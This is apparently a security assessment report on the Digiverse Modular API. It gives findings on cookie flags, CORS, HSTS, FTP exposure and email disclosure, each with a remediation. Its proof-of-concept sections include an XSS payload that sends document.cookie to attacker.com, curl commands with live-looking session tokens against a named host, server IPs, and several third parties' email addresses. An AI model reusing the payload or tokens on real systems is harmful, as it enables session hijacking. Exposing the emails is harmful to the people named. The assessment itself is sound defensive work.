1. Executive Summary

This report presents the findings from a security assessment of the Digiverse Modular API conducted between October 12-14, 2025. The assessment identified two (2) Medium severity vulnerabilities and two (2) Low severity issues that require remediation.

Key Findings

Severity Count Description
High 0 No high-severity vulnerabilities identified
Medium 2 Authentication cookie security, CORS misconfiguration
Low 2 Missing HSTS, information disclosure
Informational 3 Security headers, email disclosure, certificate info

Critical Observations

✓ Positive Security Practices:

  • Strong authentication mechanisms (Bearer tokens + session cookies)
  • HTTPS enforced throughout
  • Secure flag present on cookies
  • X-Frame-Options and X-Content-Type-Options headers implemented
  • No SQL injection or authentication bypass vulnerabilities detected

⚠︎ Areas Requiring Attention:

  • Session cookies lack HttpOnly flag, increasing XSS risk
  • Overly permissive CORS policy allows any origin
  • Missing HTTP Strict Transport Security (HSTS)

5. Detailed Findings

5.1. Cookie Without HttpOnly Flag
Medium CVSS: 5.4

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

Description

The application sets authentication cookies without the HttpOnly security flag. Testing confirmed that certain user accounts (e.g., super@ictak.info) rely on cookie-based session authentication, making them vulnerable to session hijacking if any XSS vulnerability exists.

Technical Details

Affected Endpoints:

  • POST /v1/auth/login
  • GET /v1/secure/* (all authenticated endpoints)

Vulnerable Cookie:

Set-Cookie: authToken=ce17616e-caff-4dc9-9202-d840da590861; Max-Age=86400; Expires=Wed, 15-Oct-2025 14:29:41 GMT; Path=/; Secure Missing Flag: HttpOnly

Proof of Concept

Step 1: Verify cookie-based authentication

curl 'https://digiversemodularuat.3point3labs.com/v1/secure/inventory?email=super@ictak.info&appInstanceId=test&versionCode=v1.0.12&lastUpdated=0' \ -H "Cookie: authToken=d6894cc8-1117-4e5b-b5ba-a0ae735f76e2" Response: HTTP/2 200 OK Content-Type: application/json ✓ Confirmed: Cookie-based authentication is actively used.

Step 2: Verify HttpOnly flag is missing

curl -X POST 'https://digiversemodularuat.3point3labs.com/v1/auth/login' \ -H 'Content-Type: application/json' \ -d '{"email":"super@ictak.info","appInstanceId":"test","otp":"121212","url":"https://digiversemodularuat.3point3labs.com"}' \ -v 2>&1 | grep -i "httponly" Result: No HttpOnly flag present in Set-Cookie header.

Step 3: JavaScript can access the cookie

// In a browser context (or if XSS exists): console.log(document.cookie); // Output: "authToken=d6894cc8-1117-4e5b-b5ba-a0ae735f76e2" // Attacker exfiltration payload: fetch('https://attacker.com/steal?token=' + document.cookie);

Impact

Severity Justification:

  • ✓ Cookies ARE actively used for authentication (confirmed via testing)
  • ✓ Session tokens stored in cookies can authenticate requests
  • ✗ HttpOnly flag is missing - JavaScript can read document.cookie
  • ✓ Secure flag is present - prevents transmission over HTTP
  • ⚡︎ Session duration: 24 hours (86400 seconds)

Attack Scenario:

If any XSS vulnerability exists (even undiscovered), an attacker could:

// Malicious XSS payload <script> fetch('https://attacker.com/steal?token=' + document.cookie) </script>

Result: Attacker obtains the victim's authToken and can impersonate them for 24 hours.

With HttpOnly: This attack would fail because JavaScript cannot access the cookie.

Business Impact

  • Account Takeover: Complete session hijacking for cookie-authenticated users
  • Data Breach: Unauthorized access to work orders, asset data, user information
  • Compliance: May violate security standards (OWASP ASVS, PCI DSS)
  • Defense-in-Depth: Weakens security posture by removing critical XSS mitigation

Recommendation

Primary Fix: Add HttpOnly Flag

@Configuration public class SecurityConfig { @Bean public CookieSerializer cookieSerializer() { DefaultCookieSerializer serializer = new DefaultCookieSerializer(); serializer.setCookieName("authToken"); serializer.setUseHttpOnlyCookie(true); // ← Add this serializer.setUseSecureCookie(true); // Already present serializer.setSameSite("Strict"); // Also recommended serializer.setCookiePath("/"); serializer.setCookieMaxAge(86400); return serializer; } }

Expected Result:

Set-Cookie: authToken=xxx; Max-Age=86400; Path=/; Secure; HttpOnly; SameSite=Strict

Additional Recommendations:

  1. Add SameSite Flag: Provides CSRF protection
  2. Standardize Authentication: Consider using Bearer tokens exclusively
  3. Reduce Session Lifetime: 1-4 hours instead of 24 hours

Verification Steps

# Verify HttpOnly flag present curl -X POST '.../v1/auth/login' \ -H 'Content-Type: application/json' \ -d '{"email":"super@ictak.info","appInstanceId":"test","otp":"121212"}' \ -v 2>&1 | grep "HttpOnly" Expected: Set-Cookie: authToken=...; HttpOnly // Verify JavaScript cannot access cookie document.cookie // Should NOT show authToken value

References

  • OWASP: HttpOnly Cookie Flag
  • OWASP ASVS v4.0.3: Section 3.4.2
  • CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
5.2. CORS Misconfiguration: Arbitrary Origin Trusted
Medium CVSS: 5.3

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Description

The application implements an overly permissive Cross-Origin Resource Sharing (CORS) policy on authenticated endpoints. The /v1/secure/files endpoint responds with Access-Control-Allow-Origin: *, allowing any domain to interact with the API.

Technical Details

Affected Endpoints:

  • POST /v1/secure/files
  • Other endpoints may be affected (partial testing performed)

Current CORS Configuration:

Access-Control-Allow-Origin: * Vary: Origin Vary: Access-Control-Request-Method Vary: Access-Control-Request-Headers

Key Issue: Wildcard (*) origin combined with authenticated endpoints.

Proof of Concept

Test 1: Wildcard CORS with authenticated endpoint

curl -X POST 'https://digiversemodularuat.3point3labs.com/v1/secure/files' \ -H "Origin: https://malicious-attacker.com" \ -H "Authorization: Bearer [REDACTED]" \ -H 'Content-Type: application/json' \ -d '{"uuid":"test.jpg","fileType":"jpg","createdOn":1234567890,"fileSize":1000,"isCompressed":true}' \ -v Response: HTTP/2 400 Bad Request access-control-allow-origin: * vary: Origin ✓ Confirmed: Any origin is trusted.

Test 2: Arbitrary origin accepted

curl -X POST 'https://digiversemodularuat.3point3labs.com/v1/secure/files' \ -H "Origin: https://evil.example.com" \ -H "Authorization: Bearer [TOKEN]" \ -d '{"uuid":"test.jpg",...}' Result: Same permissive CORS headers returned.

Impact

Current Risk: Low-Medium

  • Cannot directly steal authenticated data due to browser CORS protections
  • Requests from arbitrary origins allowed but cannot include credentials
  • May expose non-sensitive API metadata to unauthorized domains

Future Risk: High (if misconfigured further)

If Access-Control-Allow-Credentials: true is added:

Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true ← DANGEROUS COMBINATION

This would enable:

  • Cross-origin authenticated requests from malicious sites
  • Data exfiltration when logged-in users visit attacker sites
  • Complete bypass of same-origin policy

Business Impact

  • Data Integrity Risk: Future misconfigurations could allow unauthorized data modification
  • Information Disclosure: API behavior exposed to any origin
  • Compliance: May violate data protection regulations
  • Defense-in-Depth: Weakens security boundary

Recommendation

Option 1: Restrict to Specific Origins (Recommended)

@Configuration public class WebSecurityConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/v1/secure/**") .allowedOrigins( "https://your-production-app.com", "https://your-staging-app.com" ) .allowedMethods("GET", "POST", "PUT", "DELETE") .allowedHeaders("Authorization", "Content-Type") .allowCredentials(false) // Keep false unless required .maxAge(3600); } }

Option 2: Remove CORS (If Same-Origin)

If frontend served from same domain:

// Remove @CrossOrigin annotation entirely @PostMapping("/v1/secure/files") public ResponseEntity uploadFile(@RequestBody FileRequest request) { // ... implementation }

✗ NEVER Implement This Pattern:

// DANGEROUS - Never combine wildcard with credentials @CrossOrigin(origins = "*", allowCredentials = "true")

Verification Steps

# Should reject arbitrary origins curl -X OPTIONS 'https://digiversemodularuat.3point3labs.com/v1/secure/files' \ -H "Origin: https://untrusted-site.com" \ -H "Access-Control-Request-Method: POST" # Expected: No Access-Control-Allow-Origin header, or specific trusted origin only

References

  • OWASP: CORS Security
  • PortSwigger: Exploiting CORS Misconfigurations
  • CWE-942: Overly Permissive Cross-domain Whitelist
5.3. Missing HTTP Strict Transport Security (HSTS)
Low CVSS: 3.7

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

Description

The application does not implement HTTP Strict Transport Security (HSTS), which instructs browsers to only connect via HTTPS. While the application uses HTTPS, the absence of HSTS means browsers won't enforce HTTPS-only connections.

Technical Details

Missing Header:

Strict-Transport-Security: max-age=31536000; includeSubDomains

Current Security Headers:

✓ X-Content-Type-Options: nosniff ✓ X-Xss-Protection: 1; mode=block ✓ X-Frame-Options: DENY ✓ Cache-Control: no-cache, no-store ✗ Strict-Transport-Security: [MISSING]

Proof of Concept

curl -I https://digiversemodularuat.3point3labs.com/v1/auth/login Response: HTTP/2 200 OK X-Content-Type-Options: nosniff X-Frame-Options: DENY (No HSTS header present)

Impact

Attack Scenario: SSL Stripping

  1. User on public WiFi types: digiversemodularuat.3point3labs.com
  2. Browser sends initial HTTP request (no HTTPS remembered)
  3. Attacker intercepts → strips HTTPS upgrade → proxies traffic
  4. User unknowingly communicates over HTTP
  5. Credentials/tokens stolen in cleartext

Risk Level:

  • Requires attacker in network path (public WiFi, compromised router)
  • First visit always vulnerable (Trust On First Use)
  • Subsequent visits also vulnerable without HSTS

Recommendation

@Configuration public class SecurityConfig { @Bean public SecurityFilterChain filterChain(HttpSecurity http) throws Exception { http.headers(headers -> headers .httpStrictTransportSecurity(hsts -> hsts .maxAgeInSeconds(31536000) // 1 year .includeSubDomains(true) .preload(true) ) ); return http.build(); } }

Expected Result:

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Additional Recommendations:

  1. HSTS Preloading: Submit domain to hstspreload.org
  2. Redirect HTTP → HTTPS: At load balancer/infrastructure level
  3. Long max-age: Start with 1 year (31536000 seconds)

Verification

curl -I https://digiversemodularuat.3point3labs.com # Expected: Strict-Transport-Security header present

References

  • OWASP: HSTS Cheat Sheet
  • CWE-523: Unprotected Transport of Credentials
5.4. Exposed FTP Service
Low CVSS: 3.1

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

Description

Infrastructure scanning revealed FTP service (port 21/tcp) exposed on the application servers. FTP is an insecure protocol that transmits credentials in cleartext.

Technical Details

Affected Hosts:

  • 3.108.6.20 (AWS Mumbai Region)
  • 13.200.17.154 (AWS Mumbai Region)

Nmap Results:

PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 443/tcp open https

Service Detection:

sudo nmap -sVC -p21 3.108.6.20 21/tcp open ftp? Service version could not be determined (likely filtered/protected).

Impact

Potential Risks:

  • FTP transmits credentials in cleartext
  • Vulnerable to credential interception
  • May be unused legacy service
  • Increases attack surface

Mitigating Factors:

  • Service appears filtered (version detection failed)
  • May be behind AWS security groups
  • No anonymous FTP access confirmed

Recommendation

  1. Verify if FTP is required for operational purposes
  2. If not required: Disable FTP service and close port 21
  3. If required:
    • Use SFTP (SSH File Transfer Protocol) instead
    • Restrict access via AWS Security Groups
    • Implement strong authentication
    • Enable logging and monitoring

AWS Security Group Example:

{ "IpProtocol": "tcp", "FromPort": 21, "ToPort": 21, "IpRanges": [ { "CidrIp": "0.0.0.0/0", ← Remove this "Description": "FTP" } ] } Recommended: Remove or restrict to specific trusted IPs only.

Verification

# Verify FTP is no longer accessible nmap -p21 3.108.6.20 # Expected: filtered or closed
5.5. Email Addresses Disclosed in API Responses
Info

Description

Multiple API endpoints return email addresses of users and personnel in their responses. This information disclosure may facilitate social engineering or enumeration attacks.

Affected Endpoints

  • GET /v1/secure/workorders-with-assets
  • GET /v1/secure/master-data-without-assets
  • GET /v1/secure/lcam/admin-actions

Sample Disclosed Emails

amit@3point3labs.com john.wick@3point3labs.com 107102@amrest.eu 7301@SHELLPL.PL klaudia.sitek@amrest.eu Mariusz.Madry@cbre.com Zbigniew.Dybowski@cbre.com

Impact

  • Email addresses may be intentional for contact information
  • Could facilitate targeted phishing attacks
  • May reveal internal personnel structure
  • Increases spam/phishing exposure

Recommendation

  1. Review necessity of each email address in API responses
  2. Remove personal emails where possible
  3. Use role-based addresses (e.g., support@example.com)
  4. Implement access controls to limit who can see email addresses
5.6. Input Reflection in JSON Responses
Info

Description

The API reflects user input in JSON error responses without HTML encoding. However, this presents no security risk due to proper content-type headers and browser protections.

Example

curl -X POST 'https://digiversemodularuat.3point3labs.com/v1/secure/files' \ -H 'Content-Type: application/json' \ -d '{"uuid":"<script>alert(1)</script>"}' Response: Content-Type: application/json {"message":"...<script>alert(1)</script>..."}

Mitigating Factors

  • ✓ Content-Type: application/json prevents browser execution
  • ✓ X-Content-Type-Options: nosniff prevents MIME-sniffing
  • ✓ Modern browsers don't execute JSON as HTML

Recommendation

Optional (Defense-in-Depth): Consider sanitizing user input in error messages.

7. Conclusion & Recommendations

7.1. Summary

The Digiverse Modular API demonstrates generally good security practices with proper authentication, HTTPS implementation, and several security headers. However, two medium-severity vulnerabilities require attention:

  1. Authentication cookies lack HttpOnly flag (Medium)
  2. CORS allows arbitrary origins (Medium)

7.2. Prioritized Remediation Roadmap

Priority Finding Estimated Effort Timeline
High HttpOnly cookie flag 1-2 hours Immediate
High CORS restriction 2-4 hours Immediate
Medium HSTS implementation 1 hour Week 1
Medium FTP service review 2-4 hours Week 1-2
Low Email disclosure review 4-8 hours Week 2-4

7.3. Strategic Recommendations

Short-Term (0-2 weeks)

  1. ✓ Add HttpOnly and SameSite flags to authentication cookies
  2. ✓ Implement CORS allowlist for trusted origins
  3. ✓ Enable HSTS with 1-year max-age
  4. ✓ Review and restrict/disable FTP service

Medium-Term (1-3 months)

  1. Conduct security awareness training for developers
  2. Implement Web Application Firewall (AWS WAF)
  3. Enable AWS CloudTrail logging for audit trails
  4. Perform security code review of authentication module

Long-Term (3-6 months)

  1. Implement automated security scanning in CI/CD
  2. Conduct regular penetration testing (quarterly)
  3. Consider bug bounty program for production
  4. Implement advanced rate limiting and DDoS protection

7.4. False Positives Eliminated

During testing, the following automated scanner findings were manually validated and determined to be FALSE POSITIVES:

  • ✗ Server-Side Template Injection (SSTI) - False positive caused by Jackson JSON date parsing errors
  • ✗ XML Injection - False positive; input treated as literal string, not parsed as XML
  • ✗ CSRF on /v1/secure/search-reports - False positive; endpoint uses Bearer token authentication (CSRF-safe)

These findings were excluded from the report to maintain accuracy.
